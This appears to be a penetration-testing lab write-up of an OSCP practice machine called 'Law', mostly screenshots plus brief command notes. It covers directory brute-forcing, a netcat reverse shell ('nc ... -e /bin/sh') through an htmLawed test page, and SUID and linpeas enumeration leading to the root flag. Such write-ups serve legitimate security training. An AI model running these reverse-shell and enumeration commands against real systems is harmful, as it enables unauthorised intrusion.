...
![OSCP Law Linux Image1](/images/OSCP%20-%20Law%20-%20Linux%20-%20image1.png)
...
![OSCP Law Linux Image2](/images/OSCP%20-%20Law%20-%20Linux%20-%20image2.png)
- Ran `gobuster dir -u http://192.168.201.190 -w /usr/share/dirb/wordlists/big.txt -x php,html,htm,txt` to identify any files
![OSCP Law Linux Image3](/images/OSCP%20-%20Law%20-%20Linux%20-%20image3.png)
...
![OSCP Law Linux Image4](/images/OSCP%20-%20Law%20-%20Linux%20-%20image4.png)
...
![OSCP Law Linux Image5](/images/OSCP%20-%20Law%20-%20Linux%20-%20image5.png)
- Processed request and recieved `404 Not Found`
![OSCP Law Linux Image6](/images/OSCP%20-%20Law%20-%20Linux%20-%20image6.png)
- Checked `BurpSuite` proxy history and found request was going to `htmLawedTest.php`.
![OSCP Law Linux Image7](/images/OSCP%20-%20Law%20-%20Linux%20-%20image7.png)
...
![OSCP Law Linux Image8](/images/OSCP%20-%20Law%20-%20Linux%20-%20image8.png)
...
![OSCP Law Linux Image9](/images/OSCP%20-%20Law%20-%20Linux%20-%20image9.png)
- Reattempted with `nc 192.168.45.215 4444 -e /bin/sh` and successfully caught reverse shell for initial access
![OSCP Law Linux Image10](/images/OSCP%20-%20Law%20-%20Linux%20-%20image10.png)
---
# Lateral Movement to user
## Local Enumeration
- Attempted to use `python3` to upgrade shell but broke reverse shell and had to restart netcat listener
![OSCP Law Linux Image11](/images/OSCP%20-%20Law%20-%20Linux%20-%20image11.png)
...
![OSCP Law Linux Image12](/images/OSCP%20-%20Law%20-%20Linux%20-%20image12.png)
- Ran `find / -perm -u=s -type f 2>/dev/null -printf "%f\n"` to find binaries with potential SUID bit set
![OSCP Law Linux Image13](/images/OSCP%20-%20Law%20-%20Linux%20-%20image13.png)

---
# Privilege Escalation
## Local Enumeration
- Ran `cat /etc/passwd` to identify any other users
![OSCP Law Linux Image14](/images/OSCP%20-%20Law%20-%20Linux%20-%20image14.png)
- Uploaded and ran `suider.sh` to find potential SUID exploits
![OSCP Law Linux Image15](/images/OSCP%20-%20Law%20-%20Linux%20-%20image15.png)
- Uploaded and ran `linpeas.sh` to find potential Privilege Escalations
![OSCP Law Linux Image16](/images/OSCP%20-%20Law%20-%20Linux%20-%20image16.png)
- Found `cleanup.sh` in `www-data` home directory
![OSCP Law Linux Image17](/images/OSCP%20-%20Law%20-%20Linux%20-%20image17.png)
- Ran `cat /var/www/cleanup.sh` to view `cleanup.sh`
![OSCP Law Linux Image18](/images/OSCP%20-%20Law%20-%20Linux%20-%20image18.png)
...
![OSCP Law Linux Image19](/images/OSCP%20-%20Law%20-%20Linux%20-%20image19.png)
...
![OSCP Law Linux Image20](/images/OSCP%20-%20Law%20-%20Linux%20-%20image20.png)
- Ran `cat /root/proof.txt` to print `proof.txt` flag
![OSCP Law Linux Image21](/images/OSCP%20-%20Law%20-%20Linux%20-%20image21.png)
---
# Trophy & Loot
